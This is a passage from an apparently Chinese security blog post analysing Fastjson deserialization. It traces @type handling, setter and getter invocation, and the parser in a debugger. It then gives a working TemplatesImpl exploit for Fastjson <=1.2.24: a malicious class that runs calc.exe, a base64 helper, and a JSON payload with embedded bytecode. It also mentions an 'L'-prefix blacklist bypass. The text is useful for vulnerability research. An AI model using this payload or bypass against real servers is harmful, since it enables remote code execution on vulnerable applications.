age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用空参构造&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用形参构造&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用getName()&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用setName()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用getAge()&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用fastjson组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><br><span class="hljs-comment">//序列号</span><br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>System.out.println(serializedStr);<br><br><span class="hljs-comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parse(serializedStr);<br>System.out.println(<span class="hljs-string">&quot;parse反序列化对象名称:&quot;</span>+obj1.getClass().getName());<br>System.out.println(<span class="hljs-string">&quot;parse反序列化：&quot;</span>+obj1);<br><br><span class="hljs-comment">//通过parseObject,不指定类，返回的是一个JSONObject</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> JSON.parseObject(serializedStr);<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化对象名称:&quot;</span>+obj2.getClass().getName());<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化:&quot;</span>+obj2);<br><br><span class="hljs-comment">//通过parseObject,指定类后返回的是一个相应的类对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj3</span> <span class="hljs-operator">=</span> JSON.parseObject(serializedStr,User.class);<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化对象名称:&quot;</span>+obj3.getClass().getName());<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化:&quot;</span>+obj3);<br></code></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="/image/image-20220128114618360.png" alt="image-20220128114618360"></p><p>返回结果可知：parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</p><h3 id="2-type"><a href="#2-type" class="headerlink" title="2.@type"></a>2.@type</h3><pre><code class="hljs">JSON.toJSONString存在3个重载方法，使用toJSONString(Object object, SerializerFeature... features)方法</code></pre><p><img src="/image/image-20220128150238092.png" alt="image-20220128150238092"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr1</span> <span class="hljs-operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);<br>System.out.println(serializedStr1);<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">调用形参构造<br>调用getAge()<br>调用getName()<br>&#123;&quot;@type&quot;:&quot;fastjson.User&quot;,&quot;age&quot;:12,&quot;name&quot;:&quot;zhangsan&quot;&#125;<br></code></pre></td></tr></table></figure><p>发现输出中存在”@type”:”fastjson.User”，对其反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><br><span class="hljs-comment">//序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>System.out.println(serializedStr);<br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr1</span> <span class="hljs-operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);<br>System.out.println(serializedStr1);<br><br>System.out.println(JSON.parse(serializedStr).getClass().toString());<br>System.out.println(JSON.parse(serializedStr1).getClass().toString());<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html">调用形参构造<br>调用getAge()<br>调用getName()<br>&#123;&quot;age&quot;:12,&quot;name&quot;:&quot;zhangsan&quot;&#125;<br>调用getAge()<br>调用getName()<br>&#123;&quot;@type&quot;:&quot;fastjson.User&quot;,&quot;age&quot;:12,&quot;name&quot;:&quot;zhangsan&quot;&#125;<br>class com.alibaba.fastjson.JSONObject<br>调用空参构造<br>调用setAge()<br>调用setName()<br>class fastjson.User<br></code></pre></td></tr></table></figure><p>由此可知以下结论：</p><ul><li><p>com.alibaba.fastjson.JSONObject不能强制转换为其他类型</p></li><li><p>不指定@type不会调用<strong>构造方法</strong>和<strong>setter</strong></p></li><li><p>指定@type时，parse只会调用<strong>构造方法</strong>和特定setter，而parseObject会额外调用getter</p></li><li><p>跟进parseObject()可以看到和parse的区别：</p><p>public static JSONObject parseObject(String text) {<br>    Object obj &#x3D; parse(text);<br>    return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);<br>}</p></li></ul><p>编写测试类Persion</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-comment">//属性</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> String full_name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean sex;<br>    <span class="hljs-keyword">private</span> Properties prop;<br>    <span class="hljs-comment">//构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Person构造函数&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//set</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-comment">//get 返回Boolean</span><br>    <span class="hljs-keyword">public</span> Boolean <span class="hljs-title function_">getSex</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getSex()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.sex;<br>    &#125;<br>    <span class="hljs-comment">//get 返回ProPerties</span><br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getProp</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getProp()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.prop;<br>    &#125;<br>    <span class="hljs-comment">//在输出时会自动调用的对象ToString函数</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[Person Object] name=&quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; full_name=&quot;</span> + <span class="hljs-built_in">this</span>.full_name  + <span class="hljs-string">&quot;, age=&quot;</span> + <span class="hljs-built_in">this</span>.age + <span class="hljs-string">&quot;, prop=&quot;</span> + <span class="hljs-built_in">this</span>.prop + <span class="hljs-string">&quot;, sex=&quot;</span> + <span class="hljs-built_in">this</span>.sex;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试序列化及反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">eneity3</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.fastjson.Person\&quot;, \&quot;name\&quot;:\&quot;zhang\&quot;, \&quot;full_name\&quot;:\&quot;zhangsan\&quot;, \&quot;age\&quot;: 18, \&quot;prop\&quot;: &#123;\&quot;123\&quot;:123&#125;, \&quot;sex\&quot;: 1&#125;&quot;</span>;<br><span class="hljs-comment">//反序列化</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(eneity3,Person.class);<br><span class="hljs-comment">//输出会调用obj对象的tooString函数</span><br>System.out.println(obj);<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">Person构造函数<br>setAge()<br>getProp()<br>[Person Object] name=zhang full_name=null, age=18, prop=null, sex=null<br></code></pre></td></tr></table></figure><pre><code class="hljs">public name 反序列化成功,private full_name 反序列化失败,private age setAge函数被调用,private sex getsex函数没有被调用,private prop getprop函数被成功调用</code></pre><p>从中得知</p><ul><li>public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。</li><li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li></ul><h3 id="3-parse过程调试"><a href="#3-parse过程调试" class="headerlink" title="3.parse过程调试"></a>3.parse过程调试</h3><p>调用过程如下：</p><p><img src="/image/2414837-20220118174133297-1132976695.png" alt="image-20220117102346305"></p><p><img src="/image/image-20220905160303063-16623649847141.png" alt="image-20220905160303063"></p><p>调用JSON#parse()方法，后调用new DefaultJSONParser();</p><p><img src="/image/image-20220905160450268-16623650916213-16623650950735.png" alt="image-20220905160450268"></p><p>new DefaultJSONParser()中调用ParserConfig.getGlobalInstance()，传入配置，配置中包含黑名单java.lang.Thread</p><p><img src="/image/image-20220906111415947-16624340578123.png" alt="image-20220906111415947"></p><p>调用至DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config)</p><p><img src="/image/image-20220905160710420-16623652323247.png" alt="image-20220905160710420"></p><p>this调用至构造方法，lexer.getCurrent()获取了lexer的ch属性，此处为获取JSON字符串的第一个字符，即{</p><p><img src="/image/image-20220905162236365-16623661597249.png" alt="image-20220905162236365"></p><p>进入DeafultJSONParser.java通过switch判断，进入到LBRACE中，此处new JSONObject对象</p><p><img src="/image/image-20220210104604897.png" alt="image-20220210104604897"></p><p>调用至JSONObject#JSONObject(int initialCapacity, boolean ordered)构造方法</p><p><img src="/image/image-20220905173804775-166237068638619.png" alt="image-20220905173804775"></p><p>调用至DeafultJSONParser#parseObject(final Map object, Object fieldName)方法，此处fieldName为null,此时尚未开始解析JSON字符串</p><p><img src="/image/image-20220905164102745-166236726415211.png" alt="image-20220905164102745"></p><p>判断下一个字符是否为 “ ,后取出”“中键名，即@type，然后判断接下来字符是否符合规则</p><p><img src="/image/image-20220905174430009-166237107164521.png" alt="image-20220905174430009"></p><p>调用TypeUtils.loadClass(typeName, config.getDefaultClassLoader())方法获取类对象</p><p><img src="/image/image-20220905164830719-166236771232813.png" alt="image-20220905164830719"></p><p>从map中取classNmae,map中缓存一些常用基本类，然后可以看到className.startsWith(“L”),会对L进行去除，重新loadClass，可利用此次对ClassName添加L绕过黑名单</p><p><img src="/image/image-20220906103214944-16624315371361.png" alt="image-20220906103214944"></p><p>利用类加载器加载类，然后将对类缓存到maping对象中</p><p><img src="/image/image-20220905164854929-166236774004015.png" alt="image-20220905164854929"></p><p>运行至ObjectDeserializer deserializer &#x3D; config.getDeserializer(clazz);</p><p><img src="/image/image-20220906153358338-16624496402555.png" alt="image-20220906153358338"></p><p>进入ParserConfig#getDeserializer(Type type)方法后进行大量判断，下图为判断黑名单，最后进入到derializer &#x3D; createJavaBeanDeserializer(clazz, type);</p><p><img src="/image/image-20220906155157758-16624507203509.png" alt="image-20220906155157758"></p><p><img src="/image/image-20220906153844118-16624499263317.png" alt="image-20220906153844118"></p><p>经过调用createJavaBeanDeserializer()设置deserializer属性，属性如下：</p><p><img src="/image/image-20220906160642016-166245160388711.png" alt="image-20220906160642016"></p><p><img src="/image/image-20220906160751848-166245167436613.png" alt="image-20220906160751848"></p><p>最后调用DeafultJSONParser#parseObject()中deserializer.deserialze(this, clazz, fieldName),进入反序列化操作</p><p><img src="/image/image-20220905171235790-166236915766317.png" alt="image-20220905171235790"></p><p>调用至JavaBeanDeserializer#protected <T> T deserialze()方法，后调用至getSeeAlso()</p><p><img src="/image/image-20220906162146410-166245250961915.png" alt="image-20220906162146410"></p><p>调用至JavaBeanDeserializer()后调用至JavaBeanInfo#build()方法</p><p><img src="/image/image-20220906162541552-166245274334517.png" alt="image-20220906162541552"></p><p>在进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法</p><p><img src="/image/image-20220906163301544-166245318412819.png" alt="image-20220906163301544"></p><p><strong>set开头的方法要求如下：</strong></p><ul><li>方法名长度大于4且以set开头，且第四个字母要是大写</li><li>非静态方法</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名。再去跟这个类的属性去比对有没有这个名称的属性。</p><p>如果没有这个属性并且这个set方法的输入是一个布尔型，会重新给属性名前面加上<strong>is</strong>，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。</p><p><strong>get开头的方法要求如下：</strong></p><ul><li>方法名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无传入参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul><h2 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><h3 id="1-Fastjson"><a href="#1-Fastjson" class="headerlink" title="1 Fastjson &lt;&#x3D;1.2.24"></a>1 Fastjson &lt;&#x3D;1.2.24</h3><h4 id="1-TemplatesImpl利用链"><a href="#1-TemplatesImpl利用链" class="headerlink" title="1&gt;.TemplatesImpl利用链"></a>1&gt;.TemplatesImpl利用链</h4><h5 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h5><ol><li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：<br><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li><li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li></ol><p>这是因为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的一些属性为private属性，服务端必须添加特性才回去从json中恢复private属性的数据。故此利用链利用条件苛刻，并不常见。</p><p><img src="/image/image-20220209171617414.png" alt="image-20220209171617414"></p><h5 id="利用链分析："><a href="#利用链分析：" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>debug调试，JSONObject obj &#x3D; JSON.parseObject(payload1, Feature.SupportNonPublicField)处下断点;此漏洞利用方法必须要存在<code>Feature.SupportNonPublicField</code>设置（即允许private对象传入）</p><p><img src="/image/image-20220210094825242.png" alt="image-20220210094825242"></p><p>进入JSON类中，发现JSON.parseObject()<code>调用了</code>JSON.parse()</p><p><img src="/image/image-20220210095210483.png" alt="image-20220210095210483"></p><p>进入到JSON类#parse(String text, Feature… features)方法中，对可控长度变量的分析，这里也就是<code>Feature.SupportNonPublicField</code>的开启识别</p><p><img src="/image/image-20220210095334436.png" alt="image-20220210095334436"></p><p>调用JSON#parse(String text, int features)，继续执行parser.parse()接口</p><p><img src="/image/image-20220210095627159.png" alt="image-20220210095627159"></p><p>进入DeafultJSONParser.java通过switch判断，进入到LBRACE中</p><p><img src="/image/image-20220210104604897.png" alt="image-20220210104604897"></p><p>调用deserializer.deserialze(this, clazz, fieldName)</p><p><img src="/image/image-20220210105038883.png" alt="image-20220210105038883"></p><p>进入ParserConfig.java 进行设置</p><p><img src="/image/image-20220210105217734.png" alt="image-20220210105217734"></p><p>进入JavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName) ，进行反序列化操作</p><p><img src="/image/image-20220210105514778.png" alt="image-20220210105514778"></p><p>设置参数是会调用FieldDeserializer.java中的setValue，已经可以看到Method方法，标志着这里触发反射</p><p><img src="/image/image-20220210111123619.png" alt="image-20220210111123619"></p><p>前面的参数会不满足if(method !&#x3D; null)的判断，到outputProperties的时候，因为它是个类，存在method，于是进入if分支，调用方法为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</p><p><img src="/image/image-20220210111822121.png" alt="image-20220210111822121"></p><p>在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()方法下断点，调用newTransformer()</p><p><img src="/image/image-20220210113532817.png" alt="image-20220210113532817"></p><p>跟进调用getTransletInstance()</p><p><img src="/image/image-20220210113623886.png" alt="image-20220210113623886"></p><p>跟进调用defineTransletClasses()s</p><p><img src="/image/image-20220210113839439.png" alt="image-20220210113839439"></p><p>最后初始化类，触发代码执行</p><h5 id="PAYLOAD"><a href="#PAYLOAD" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><p>创建恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Shell</span><span class="hljs-params">()</span> &#123;<br>    <br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    <br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    <br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>工具类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">FiletoBase64</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filename);<br>    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">io</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10240</span>];<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-keyword">while</span> ((len = io.read(buf)) &gt; <span class="hljs-number">0</span>) &#123;<br>        os.write(buf, <span class="hljs-number">0</span>, len);<br>    &#125;<br>    io.close();<br>    <br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(os.toByteArray());<br>    <span class="hljs-keyword">return</span> s;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> ClassBase64Util.FiletoBase64(<span class="hljs-string">&quot;E:\\JAVA-PAYLOAD\\mydemo\\target\\classes\\fastjson\\Shell.class&quot;</span>);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+shell+<span class="hljs-string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;<br><br><span class="hljs-comment">//System.out.println(payload1);</span><br><span class="hljs-comment">//&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAQTGZhc3Rqc29uL1NoZWxsOwEADVN0YWNrTWFwVGFibGUHACsHACkBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAClNoZWxsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEADmZhc3Rqc29uL1NoZWxsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQW